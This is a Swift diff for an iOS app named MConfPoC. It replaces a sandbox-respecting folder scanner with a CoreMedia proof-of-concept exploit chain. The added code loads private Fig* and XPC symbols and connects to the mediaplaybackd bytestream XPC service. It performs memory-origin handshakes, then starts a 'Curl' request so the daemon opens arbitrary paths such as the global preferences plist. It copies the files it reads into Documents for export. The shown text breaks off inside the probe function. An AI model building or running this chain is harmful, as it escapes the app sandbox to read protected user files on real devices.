@@ -1,38 +1,94 @@
 //
-// Safe dual-scanner implementation for iOS 15+
-// Uses only user-granted, security-scoped folder access and public Foundation APIs.
+//  ContentView.swift
+//  MConfPoC
+//
+//  CoreMedia bytestream PoC.
+//  Runs only on explicit Run-button press. The target path is supplied in the UI.
+//  Results and short execution messages are saved inside Documents/.
 //
 
 import Foundation
 import SwiftUI
 import UIKit
-import UniformTypeIdentifiers
+import Darwin
+import CoreFoundation
 
-private enum ScanMode {
-    case foldersV6
-    case filesV7
+// MARK: - Thread-Safe Logger
 
-    var title: String {
-        switch self {
-        case .foldersV6: return "Folders (v6)"
-        case .filesV7: return "Files (v7)"
+private final class Logger {
+    private let logURL: URL
+    private let queue = DispatchQueue(label: "com.poc.logger.queue")
+
+    init() {
+        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
+        self.logURL = docs.appendingPathComponent("run.log")
+    }
+
+    func resetLog() {
+        queue.async {
+            try? "".write(to: self.logURL, atomically: true, encoding: .utf8)
         }
     }
 
-    var zipSuffix: String {
-        switch self {
-        case .foldersV6: return "_v6_folders"
-        case .filesV7: return "_v7_files"
+    func log(_ message: String) {
+        queue.async {
+            let line = message + "\n"
+            if let data = line.data(using: .utf8) {
+                if let handle = try? FileHandle(forWritingTo: self.logURL) {
+                    handle.seekToEndOfFile()
+                    handle.write(data)
+                    try? handle.close()
+                } else {
+                    try? data.write(to: self.logURL, options: .atomic)
+                }
+            }
         }
     }
 }
 
-private struct ScanOutput {
-    let lines: [String]
-    let zipURL: URL?
-    let fileCount: Int
-    let totalBytes: Int64
-    let failedCount: Int
+private let globalLogger = Logger()
+
+private final class ThreadSafeEHBox {
+    private var _desc = ""
+    private var _seen = false
+    private let lock = NSLock()
+
+    var desc: String {
+        get { lock.withLock { _desc } }
+        set { lock.withLock { _desc = newValue } }
+    }
+
+    var seen: Bool {
+        get { lock.withLock { _seen } }
+        set { lock.withLock { _seen = newValue } }
+    }
+}
+
+private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
+    guard let pointer else { return }
+    Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
+}
+
+// MARK: - ContentView
+
+private let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
+private let legacyTargetPath = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"
+
+private func outputFilename(for targetPath: String) -> String {
+    let name = URL(fileURLWithPath: targetPath).lastPathComponent
+    let safeName = name.isEmpty || name == "/" ? "target.bin" : name
+    return safeName
+}
+
+private func recoveredFileURL(for targetPath: String) -> URL {
+    let filename = targetPath == legacyTargetPath
+        ? "GlobalPreferences.plist"
+        : outputFilename(for: targetPath)
+    return docs.appendingPathComponent(filename)
+}
+
+private func recoveredZipURL(for targetPath: String) -> URL {
+    docs.appendingPathComponent(outputFilename(for: targetPath) + ".zip")
 }
 
 private struct ActivityView: UIViewControllerRepresentable {
@@ -46,148 +102,154 @@ private struct ActivityView: UIViewControllerRepresentable {
 }
 
 struct ContentView: View {
-    @State private var status = "Choose a folder to scan"
-    @State private var selectedFolder: URL?
+    @State private var status = "Ready"
     @State private var isRunning = false
+    @State private var targetPath = ""
     @State private var logs: [String] = []
-    @State private var resultURL: URL?
-    @State private var showFolderPicker = false
     @State private var showExport = false
+    @State private var resultURL: URL? = nil
+    @State private var didResetSessionLog = false
 
     private let panelColor = Color(uiColor: .secondarySystemBackground)
-    private let panelShape = RoundedRectangle(cornerRadius: 18, style: .continuous)
+    private let panelShape = RoundedRectangle(cornerRadius: 20, style: .continuous)
 
     var body: some View {
-        VStack(alignment: .leading, spacing: 14) {
-            VStack(alignment: .leading, spacing: 8) {
-                Text("CoreMedia PoC — Safe Scanner")
-                    .font(.headline)
-                Text(status)
-                    .font(.system(.footnote, design: .monospaced))
-                    .foregroundStyle(.secondary)
-            }
-
-            VStack(alignment: .leading, spacing: 6) {
-                Text("Selected folder")
-                    .font(.footnote)
-                    .foregroundStyle(.secondary)
-                Text(selectedFolder?.path ?? "No folder selected")
-                    .font(.system(.footnote, design: .monospaced))
-                    .lineLimit(3)
-                    .frame(maxWidth: .infinity, minHeight: 54, alignment: .leading)
-                    .padding(12)
-                    .background(panelColor, in: panelShape)
-                Button {
-                    showFolderPicker = true
-                } label: {
-                    Label("Choose folder in Files", systemImage: "folder.badge.plus")
-                        .frame(maxWidth: .infinity)
-                        .frame(height: 48)
+        GeometryReader { geometry in
+            VStack(alignment: .leading, spacing: 14) {
+                VStack(alignment: .leading, spacing: 10) {
+                    Text("CoreMedia PoC")
+                        .font(.headline)
+                    Text(status)
+                        .font(.system(.footnote, design: .monospaced))
+                        .foregroundStyle(.secondary)
                 }
-                .buttonStyle(.bordered)
-                .disabled(isRunning)
-            }
 
-            HStack(spacing: 10) {
+                VStack(alignment: .leading, spacing: 6) {
+                    Text("Target path")
+                        .font(.footnote)
+                        .foregroundStyle(.secondary)
+                    TextField("Enter target path", text: $targetPath)
+                        .font(.system(.body, design: .monospaced))
+                        .textInputAutocapitalization(.never)
+                        .autocorrectionDisabled()
+                        .textFieldStyle(.plain)
+                        .padding(.horizontal, 14)
+                        .padding(.vertical, 16)
+                        .background(panelColor)
+                        .clipShape(panelShape)
+                        .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
+                }
+
                 Button {
-                    startScan(mode: .foldersV6)
-                } label: {
-                    VStack(spacing: 5) {
-                        Label("Folders", systemImage: "folder")
-                            .font(.system(size: 17, weight: .semibold))
-                        Text("Recursive · v6")
-                            .font(.system(size: 12, weight: .medium))
+                    guard !isRunning else { return }
+                    isRunning = true
+                    status = "Running…"
+                    resultURL = nil
+                    if !logs.isEmpty {
+                        logs.append("──────── New run ────────")
                     }
-                    .foregroundStyle(.white)
-                    .frame(maxWidth: .infinity)
-                    .frame(height: 66)
-                    .background(Color(uiColor: .systemIndigo), in: panelShape)
-                }
-                .buttonStyle(.plain)
-                .disabled(isRunning || selectedFolder == nil)
-
-                Button {
-                    startScan(mode: .filesV7)
-                } label: {
-                    VStack(spacing: 5) {
-                        Label("Files", systemImage: "doc.text")
-                            .font(.system(size: 17, weight: .semibold))
-                        Text("Direct only · v7")
-                            .font(.system(size: 12, weight: .medium))
-                    }
-                    .foregroundStyle(.white)
-                    .frame(maxWidth: .infinity)
-                    .frame(height: 66)
-                    .background(Color(uiColor: .systemBlue), in: panelShape)
-                }
-                .buttonStyle(.plain)
-                .disabled(isRunning || selectedFolder == nil)
-            }
-
-            HStack {
-                Text("Run Log")
-                    .font(.headline)
-                    .foregroundStyle(.secondary)
-                Spacer()
-                Button("Clear", role: .destructive) {
-                    logs.removeAll()
-                }
-                .disabled(isRunning)
-            }
-
-            ScrollViewReader { proxy in
-                ScrollView {
-                    LazyVStack(alignment: .leading, spacing: 5) {
-                        ForEach(Array(logs.enumerated()), id: \.offset) { index, line in
-                            Text(line)
-                                .font(.system(.caption, design: .monospaced))
-                                .frame(maxWidth: .infinity, alignment: .leading)
-                                .id(index)
+                    let requestedPath = targetPath
+                    let trimmedPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
+                    let expectedResultURL = recoveredFileURL(for: trimmedPath)
+                    let expectedZipURL = recoveredZipURL(for: trimmedPath)
+                    
+                    DispatchQueue.global(qos: .userInitiated).async {
+                        runChain(targetPath: requestedPath) { line in
+                            DispatchQueue.main.async {
+                                logs.append(line)
+                                if line.hasPrefix("Saved "),
+                                   FileManager.default.fileExists(atPath: expectedZipURL.path) {
+                                    resultURL = expectedZipURL
+                                } else if line.hasPrefix("Saved "),
+                                          FileManager.default.fileExists(atPath: expectedResultURL.path) {
+                                    resultURL = expectedResultURL
+                                }
+                            }
+                        }
+                        DispatchQueue.main.async {
+                            isRunning = false
+                            status = "Finished — see Documents/run.log"
                         }
                     }
-                    .frame(maxWidth: .infinity, alignment: .leading)
-                    .padding(12)
+                } label: {
+                    ZStack {
+                        Text("Run")
+                            .font(.system(size: 18, weight: .medium))
+                            .foregroundStyle(.white)
+                    }
+                    .frame(maxWidth: .infinity)
+                    .frame(height: 58)
+                    .contentShape(panelShape)
                 }
-                .onChange(of: logs.count) { _ in
-                    if let lastIndex = logs.indices.last {
-                        proxy.scrollTo(lastIndex, anchor: .bottom)
+                .buttonStyle(.plain)
+                .background(Color(uiColor: .systemBlue), in: panelShape)
+                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
+                .disabled(isRunning)
+
+                HStack {
+                    Text("Run Log")
+                        .font(.headline)
+                        .foregroundStyle(.secondary)
+                    Spacer()
+                    Button("Clear", role: .destructive) {
+                        logs.removeAll()
+                        globalLogger.resetLog()
+                    }
+                    .disabled(isRunning)
+                }
+
+                ScrollViewReader { proxy in
+                    ScrollView {
+                        VStack(alignment: .leading, spacing: 5) {
+                            ForEach(Array(logs.enumerated()), id: \.offset) { index, line in
+                                Text(line)
+                                    .font(.system(.caption, design: .monospaced))
+                                    .frame(maxWidth: .infinity, alignment: .leading)
+                                    .id(index)
+                            }
+                        }
+                        .frame(maxWidth: .infinity, alignment: .leading)
+                        .padding(12)
+                    }
+                    .onChange(of: logs.count) { _ in
+                        if let lastIndex = logs.indices.last {
+                            proxy.scrollTo(lastIndex, anchor: .bottom)
+                        }
                     }
                 }
-            }
-            .frame(maxWidth: .infinity, maxHeight: .infinity)
-            .background(panelColor, in: panelShape)
+                .frame(maxWidth: .infinity, maxHeight: .infinity)
+                .background(panelColor)
+                .clipShape(panelShape)
+                .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
 
-            Button {
-                guard resultURL != nil else { return }
-                showExport = true
-            } label: {
-                Label("Export result", systemImage: "square.and.arrow.up")
-                    .frame(maxWidth: .infinity)
-                    .frame(height: 50)
+                Button {
+                    guard resultURL != nil else { return }
+                    showExport = true
+                } label: {
+                    Label("Export result", systemImage: "square.and.arrow.up")
+                        .font(.body.weight(.medium))
+                        .foregroundStyle(.primary)
+                        .frame(maxWidth: .infinity)
+                        .frame(height: 50)
+                        .contentShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
+                }
+                .buttonStyle(.plain)
+                .background(panelColor, in: RoundedRectangle(cornerRadius: 16, style: .continuous))
+                .overlay(RoundedRectangle(cornerRadius: 16, style: .continuous).stroke(Color.white.opacity(0.07), lineWidth: 1))
+                .disabled(resultURL == nil || isRunning)
+                .opacity(resultURL == nil || isRunning ? 0.45 : 1)
             }
-            .buttonStyle(.bordered)
-            .disabled(resultURL == nil || isRunning)
+            .padding(.horizontal)
+            .padding(.top, 84)
+            .padding(.bottom, 8)
+            .frame(width: geometry.size.width, height: geometry.size.height, alignment: .top)
         }
-        .padding(.horizontal)
-        .padding(.top, 12)
-        .padding(.bottom, 8)
         .background(Color.black.ignoresSafeArea())
         .preferredColorScheme(.dark)
-        .fileImporter(
-            isPresented: $showFolderPicker,
-            allowedContentTypes: [.folder],
-            allowsMultipleSelection: false
-        ) { result in
-            switch result {
-            case .success(let urls):
-                guard let folder = urls.first else { return }
-                selectedFolder = folder
-                status = "Folder selected — ready"
-                logs.append("Selected folder: \(folder.lastPathComponent)")
-            case .failure(let error):
-                status = "Folder selection failed"
-                logs.append("Picker error: \(error.localizedDescription)")
-            }
+        .onAppear {
+            guard !didResetSessionLog else { return }
+            globalLogger.resetLog()
+            didResetSessionLog = true
         }
         .sheet(isPresented: $showExport) {
             if let resultURL = resultURL {
@@ -195,211 +257,450 @@ struct ContentView: View {
             }
         }
     }
-
-    private func startScan(mode: ScanMode) {
-        guard !isRunning, let folder = selectedFolder else { return }
-
-        isRunning = true
-        resultURL = nil
-        status = "Running \(mode.title)…"
-        logs.append("──────── New run: \(mode.title) ────────")
-
-        DispatchQueue.global(qos: .userInitiated).async {
-            let output = performScan(folder: folder, mode: mode)
-            DispatchQueue.main.async {
-                logs.append(contentsOf: output.lines)
-                resultURL = output.zipURL
-                status = output.zipURL == nil
-                    ? "Finished with errors — \(mode.title)"
-                    : "Finished \(mode.title) — \(output.fileCount) files"
-                isRunning = false
-            }
-        }
-    }
 }
 
-// MARK: - Public-API scanning
+// MARK: - The chain
 
-private func performScan(folder: URL, mode: ScanMode) -> ScanOutput {
-    var lines: [String] = []
-    var fileCount = 0
-    var totalBytes: Int64 = 0
-    var failedCount = 0
-    let fileManager = FileManager.default
+private func runChain(targetPath requestedPath: String, onLog: @escaping (String) -> Void) {
+    func logLine(_ message: String) {
+        globalLogger.log(message)
+        onLog(message)
+    }
+    
+    logLine("Run started")
+    let dev = UIDevice.current
+    logLine("Device: \(dev.model), iOS \(dev.systemVersion)")
 
-    func log(_ message: String) {
-        lines.append(message)
+    let targetPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
+    guard !targetPath.isEmpty, targetPath.hasPrefix("/") else {
+        logLine("Invalid target: enter an absolute file or directory path")
+        logLine("Run finished")
+        return
+    }
+    let outputName = targetPath == legacyTargetPath
+        ? "GlobalPreferences.plist"
+        : outputFilename(for: targetPath)
+    logLine("Target: \(targetPath)")
+
+    // Step 1 — resolve symbols.
+    guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL) else {
+        logLine("CoreMedia load failed"); return
+    }
+    defer { dlclose(cm) }
+
+    let rtld = UnsafeMutableRawPointer(bitPattern: -2)
+    guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
+          let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
+          let pComp  = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
+          let pRecip = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
+          let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
+          let pConnCreate = dlsym(rtld, "xpc_connection_create_mach_service"),
+          let pSetEH = dlsym(rtld, "xpc_connection_set_event_handler"),
+          let pResume = dlsym(rtld, "xpc_connection_resume"),
+          let pConnCancel = dlsym(rtld, "xpc_connection_cancel"),
+          let pSendReply = dlsym(rtld, "xpc_connection_send_message_with_reply"),
+          let pVal = dlsym(rtld, "xpc_dictionary_get_value"),
+          let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
+          let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
+          let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
+          let pGetData = dlsym(rtld, "xpc_dictionary_get_data"),
+          let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
+          let pSetI64 = dlsym(rtld, "xpc_dictionary_set_int64"),
+          let pDesc = dlsym(rtld, "xpc_copy_description"),
+          let pType = dlsym(rtld, "xpc_get_type"),
+          let pTypeName = dlsym(rtld, "xpc_type_get_name"),
+          let pRetain = dlsym(rtld, "xpc_retain"),
+          let pRel = dlsym(rtld, "xpc_release") else {
+        logLine("Required symbol missing"); return
     }
 
-    let didStartAccess = folder.startAccessingSecurityScopedResource()
+    typealias FBasic = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
+    typealias FBegin = @convention(c) (UnsafeMutableRawPointer?) -> Int32
+    typealias FComp = @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
+    typealias FRecip = @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
+    typealias FSetURL = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
+    typealias FConnCreate = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
+    typealias FSetEH = @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
+    typealias FResume = @convention(c) (UnsafeMutableRawPointer?) -> Void
+    typealias FConnCancel = @convention(c) (UnsafeMutableRawPointer?) -> Void
+    typealias FSendReply = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
+    typealias FVal = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
+    typealias FU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
+    typealias FSetU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
+    typealias FDupFd = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
+    typealias FGetData = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UnsafeMutablePointer<Int>?) -> UnsafeRawPointer?
+    typealias FI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
+    typealias FSetI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void
+    typealias FDesc = @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
+    typealias FType = @convention(c) (OpaquePointer?) -> OpaquePointer?
+    typealias FTypeName = @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
+    typealias FRetain = @convention(c) (OpaquePointer?) -> Void
+    typealias FRel = @convention(c) (OpaquePointer?) -> Void
+
+    let fBasic = unsafeBitCast(pBasic, to: FBasic.self)
+    let fBegin = unsafeBitCast(pBegin, to: FBegin.self)
+    let fComp = unsafeBitCast(pComp, to: FComp.self)
+    let fRecip = unsafeBitCast(pRecip, to: FRecip.self)
+    let fSetURL = unsafeBitCast(pSetURL, to: FSetURL.self)
+    let fConnCreate = unsafeBitCast(pConnCreate, to: FConnCreate.self)
+    let fSetEH = unsafeBitCast(pSetEH, to: FSetEH.self)
+    let fResume = unsafeBitCast(pResume, to: FResume.self)
+    let fConnCancel = unsafeBitCast(pConnCancel, to: FConnCancel.self)
+    let fSendReply = unsafeBitCast(pSendReply, to: FSendReply.self)
+    let fVal = unsafeBitCast(pVal, to: FVal.self)
+    let fU64 = unsafeBitCast(pU64, to: FU64.self)
+    let fSetU64 = unsafeBitCast(pSetU64, to: FSetU64.self)
+    let fDupFd = unsafeBitCast(pDupFd, to: FDupFd.self)
+    let fGetData = unsafeBitCast(pGetData, to: FGetData.self)
+    let fI64 = unsafeBitCast(pI64, to: FI64.self)
+    let fSetI64 = unsafeBitCast(pSetI64, to: FSetI64.self)
+    let fDesc = unsafeBitCast(pDesc, to: FDesc.self)
+    let fType = unsafeBitCast(pType, to: FType.self)
+    let fTypeName = unsafeBitCast(pTypeName, to: FTypeName.self)
+    let fRetain = unsafeBitCast(pRetain, to: FRetain.self)
+    let fRel = unsafeBitCast(pRel, to: FRel.self)
+
+    func desc(_ o: OpaquePointer?) -> String {
+        guard let o = o, let c = fDesc(o) else { return "nil" }
+        defer { free(c) }
+        return String(cString: c).replacingOccurrences(of: "\n", with: " ")
+    }
+    func typeName(_ o: OpaquePointer?) -> String {
+        guard let o = o, let t = fType(o), let n = fTypeName(t) else { return "?" }
+        return String(cString: n)
+    }
+
+    // Step 2 — connect.
+    guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
+        logLine("XPC connection failed"); return
+    }
+    
+    var memoryRecipient: UnsafeMutableRawPointer? = nil
+    var memoryOrigin: UnsafeMutableRawPointer? = nil
+
     defer {
-        if didStartAccess {
-            folder.stopAccessingSecurityScopedResource()
-        }
+        releaseFigReference(memoryOrigin)
+        releaseFigReference(memoryRecipient)
+        fConnCancel(conn)
+        fRel(OpaquePointer(conn))
+        logLine("XPC connection cancelled and released")
+        logLine("Run finished")
     }
 
-    log("Run started: \(mode.title)")
-    log("Folder: \(folder.path)")
-    log("Security-scoped access: \(didStartAccess ? "started" : "not required / unavailable")")
-
-    var isDirectory: ObjCBool = false
-    guard fileManager.fileExists(atPath: folder.path, isDirectory: &isDirectory), isDirectory.boolValue else {
-        log("Selected URL is not an accessible directory.")
-        return ScanOutput(lines: lines, zipURL: nil, fileCount: 0, totalBytes: 0, failedCount: 1)
+    let ehBox = ThreadSafeEHBox()
+    let eh: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
+        guard let obj = obj else { return }
+        ehBox.desc = "\(typeName(OpaquePointer(obj))): \(String(desc(OpaquePointer(obj)).prefix(200)))"
+        ehBox.seen = true
     }
+    fSetEH(conn, eh as AnyObject)
+    fResume(conn)
+    logLine("XPC connected")
 
-    let folderName = folder.lastPathComponent.isEmpty ? "SelectedFolder" : folder.lastPathComponent
-    let temporaryRoot = fileManager.temporaryDirectory.appendingPathComponent("SafeScan-\(UUID().uuidString)", isDirectory: true)
-    let outputRoot = temporaryRoot.appendingPathComponent(folderName, isDirectory: true)
+    func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
+        guard let m = m else { return (nil, "nil") }
+        let sem = DispatchSemaphore(value: 0)
+        var out: OpaquePointer? = nil
+        var tn = "?"
+        var isTimedOut = false
+        let lock = NSLock()
 
-    do {
-        try fileManager.createDirectory(at: outputRoot, withIntermediateDirectories: true)
-    } catch {
-        log("Could not create temporary output folder: \(error.localizedDescription)")
-        return ScanOutput(lines: lines, zipURL: nil, fileCount: 0, totalBytes: 0, failedCount: 1)
-    }
-    defer { try? fileManager.removeItem(at: temporaryRoot) }
-
-    func copyRegularFile(_ sourceURL: URL, relativePath: String) {
-        do {
-            let values = try sourceURL.resourceValues(forKeys: [.isRegularFileKey, .isSymbolicLinkKey, .fileSizeKey])
-            guard values.isSymbolicLink != true, values.isRegularFile == true else { return }
-
-            let destinationURL = outputRoot.appendingPathComponent(relativePath)
-            try fileManager.createDirectory(
-                at: destinationURL.deletingLastPathComponent(),
-                withIntermediateDirectories: true
-            )
-            if fileManager.fileExists(atPath: destinationURL.path) {
-                try fileManager.removeItem(at: destinationURL)
+        let hb: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
+            lock.withLock {
+                guard !isTimedOut else { return }
+                guard let obj = obj else { sem.signal(); return }
+                tn = typeName(OpaquePointer(obj))
+                if tn == "dictionary" || tn == "error" {
+                    fRetain(OpaquePointer(obj))
+                    out = OpaquePointer(obj)
+                }
+                sem.signal()
             }
-            try fileManager.copyItem(at: sourceURL, to: destinationURL)
-            fileCount += 1
-            totalBytes += Int64(values.fileSize ?? 0)
-        } catch {
-            failedCount += 1
-            log("Could not copy \(relativePath): \(error.localizedDescription)")
         }
+        fSendReply(conn, m, nil, hb as AnyObject)
+        if sem.wait(timeout: .now() + 8) != .success {
+            lock.withLock { isTimedOut = true }
+            return (nil, "timeout-8s")
+        }
+        return (out, tn)
     }
 
-    switch mode {
-    case .filesV7:
-        log("v7: scanning regular files directly inside the selected folder.")
-        do {
-            let children = try fileManager.contentsOfDirectory(
-                at: folder,
-                includingPropertiesForKeys: [.isRegularFileKey, .isDirectoryKey, .isSymbolicLinkKey, .fileSizeKey],
-                options: []
-            ).sorted { $0.lastPathComponent.localizedStandardCompare($1.lastPathComponent) == .orderedAscending }
+    // Step 3 — memory-origin handshake.
+    var rp2Ready = false
+    var handshakeReady = false
 
-            for child in children {
-                do {
-                    let values = try child.resourceValues(forKeys: [.isRegularFileKey, .isSymbolicLinkKey])
-                    if values.isRegularFile == true && values.isSymbolicLink != true {
-                        copyRegularFile(child, relativePath: child.lastPathComponent)
+    var rp1Msg: UnsafeMutableRawPointer? = nil
+    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {
+        let (r1, t1) = send(m1)
+        let replyDetail = (t1 == "error") ? " — \(desc(r1))" : ""
+        logLine("Handshake 1: \(t1)\(replyDetail)")
+        fRel(OpaquePointer(m1))
+
+        if let r1 = r1, t1 == "dictionary" {
+            var rp2Msg: UnsafeMutableRawPointer? = nil
+            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {
+                let cr = "mconf".withCString { fRecip(r1, m2, $0, &memoryRecipient) }
+                logLine("Recipient creation: status=\(cr), object=\(memoryRecipient == nil ? "nil" : "present")")
+
+                if cr == 0, memoryRecipient != nil {
+                    let (r2, t2) = send(m2)
+                    let replyDetail2 = (t2 == "error") ? " — \(desc(r2))" : ""
+                    logLine("Handshake 2: \(t2)\(replyDetail2)")
+                    rp2Ready = (t2 == "dictionary" && r2 != nil)
+                    if let r2 = r2 { fRel(r2) }
+                } else {
+                    logLine("Handshake 2 skipped: memory recipient was not created")
+                }
+                fRel(OpaquePointer(m2))
+            } else {
+                logLine("Handshake 2 message creation failed")
+            }
+            fRel(r1)
+        }
+    } else {
+        logLine("Handshake 1 message creation failed")
+    }
+
+    if rp2Ready {
+        var orgMsg: UnsafeMutableRawPointer? = nil
+        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {
+            let bg = fBegin(om)
+            logLine("Origin begin: status=\(bg)")
+            if bg == 0 {
+                let (or, ot) = send(om)
+                let originReplyDetail = (ot == "error") ? " — \(desc(or))" : ""
+                logLine("Origin: \(ot)\(originReplyDetail)")
+                if let or = or {
+                    if ot == "dictionary" {
+                        let cp = fComp(or, &memoryOrigin)
+                        handshakeReady = (cp == 0 && memoryOrigin != nil)
+                        logLine("Origin established: \(handshakeReady ? "yes" : "no (status=\(cp))")")
+                    } else {
+                        logLine("Origin response was not a dictionary")
                     }
-                } catch {
-                    failedCount += 1
-                    log("Could not inspect \(child.lastPathComponent): \(error.localizedDescription)")
+                    fRel(or)
+                }
+            } else {
+                logLine("Origin begin failed; .org request skipped")
+            }
+            fRel(OpaquePointer(om))
+        } else {
+            logLine("Origin message creation failed")
+        }
+    } else {
+        logLine("Origin handshake skipped: .rp1/.rp2 did not complete")
+    }
+
+    func directoryEntryName(_ entry: UnsafeMutablePointer<dirent>) -> String {
+        let capacity = MemoryLayout.size(ofValue: entry.pointee.d_name)
+        return withUnsafePointer(to: &entry.pointee.d_name) { namePointer in
+            namePointer.withMemoryRebound(to: CChar.self, capacity: capacity) {
+                String(cString: $0)
+            }
+        }
+    }
+
+    /// Перечисляет папку и возвращает обычные файлы
+    func getFilesInDirectory(fd: Int32) -> [String] {
+        guard let directory = fdopendir(fd) else {
+            let savedErrno = errno
+            close(fd)
+            logLine("Directory stream creation failed: errno=\(savedErrno)")
+            return []
+        }
+        defer { closedir(directory) } // closedir сам закроет fd
+
+        let directoryFD = dirfd(directory)
+        var fileNames: [String] = []
+
+        while true {
+            errno = 0
+            guard let entry = readdir(directory) else { break }
+            let name = directoryEntryName(entry)
+            if name == "." || name == ".." { continue }
+
+            var isRegularFile = false
+            var itemStat = stat()
+            let statResult = name.withCString {
+                fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
+            }
+            
+            if statResult == 0 {
+                if (itemStat.st_mode & mode_t(S_IFMT)) == mode_t(S_IFREG) {
+                    isRegularFile = true
+                }
+            } else {
+                let dType = entry.pointee.d_type
+                if dType == UInt8(DT_REG) {
+                    isRegularFile = true
+                } else if dType != UInt8(DT_DIR) && dType != 4 {
+                    isRegularFile = true
                 }
             }
-        } catch {
-            failedCount += 1
-            log("Could not list selected folder: \(error.localizedDescription)")
+
+            if isRegularFile {
+                fileNames.append(name)
+            }
         }
 
-    case .foldersV6:
-        log("v6: recursively scanning folders and files, preserving directory structure.")
-        let keys: [URLResourceKey] = [.isRegularFileKey, .isDirectoryKey, .isSymbolicLinkKey, .fileSizeKey]
-        if let enumerator = fileManager.enumerator(
-            at: folder,
-            includingPropertiesForKeys: keys,
-            options: [],
-            errorHandler: { failedURL, error in
-                failedCount += 1
-                log("Could not enumerate \(failedURL.lastPathComponent): \(error.localizedDescription)")
-                return true
-            }
-        ) {
-            for case let child as URL in enumerator {
-                let standardizedRoot = folder.standardizedFileURL.path
-                let standardizedChild = child.standardizedFileURL.path
-                let prefix = standardizedRoot.hasSuffix("/") ? standardizedRoot : standardizedRoot + "/"
-                guard standardizedChild.hasPrefix(prefix) else {
-                    failedCount += 1
-                    log("Skipped path outside selected folder: \(child.path)")
-                    continue
-                }
-                let relativePath = String(standardizedChild.dropFirst(prefix.count))
-                guard !relativePath.isEmpty else { continue }
+        fileNames.sort { $0.localizedStandardCompare($1) == .orderedAscending }
+        return fileNames
+    }
 
-                do {
-                    let values = try child.resourceValues(forKeys: keys)
-                    if values.isSymbolicLink == true { continue }
-                    if values.isDirectory == true {
-                        try fileManager.createDirectory(
-                            at: outputRoot.appendingPathComponent(relativePath, isDirectory: true),
-                            withIntermediateDirectories: true
-                        )
-                    } else if values.isRegularFile == true {
-                        copyRegularFile(child, relativePath: relativePath)
+    // Сохраняет одиночный файл
+    func saveFile(fd: Int32, outputName: String) {
+        defer { close(fd) }
+        var st = stat()
+        guard fstat(fd, &st) == 0 else {
+            logLine("fstat failed: errno=\(errno)")
+            return
+        }
+
+        let size = Int64(st.st_size)
+        guard size > 0 else {
+            logLine("File \(outputName) is empty (\(size) bytes)")
+            return
+        }
+        guard size <= Int64(Int.max) else {
+            logLine("File \(outputName) is too large: \(size) bytes")
+            return
+        }
+        var buffer = [UInt8](repeating: 0, count: Int(size))
+        let count = pread(fd, &buffer, buffer.count, 0)
+        guard count > 0 else {
+            logLine("Read failed for \(outputName): errno=\(errno)")
+            return
+        }
+        let output = docs.appendingPathComponent(outputName)
+        do {
+            try Data(buffer.prefix(count)).write(to: output, options: .atomic)
+            logLine("Saved \(count) bytes: \(outputName)")
+        } catch {
+            logLine("Save failed for \(outputName): \(error.localizedDescription)")
+        }
+    }
+
+    // Проба пути через 'Curl' daemon
+    func probe(_ path: String) -> Int32? {
+        let cfURL = URL(fileURLWithPath: path) as CFURL
+        var msg: UnsafeMutableRawPointer? = nil
+        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {
+            logLine("Request message failed for: \(path)"); return nil
+        }
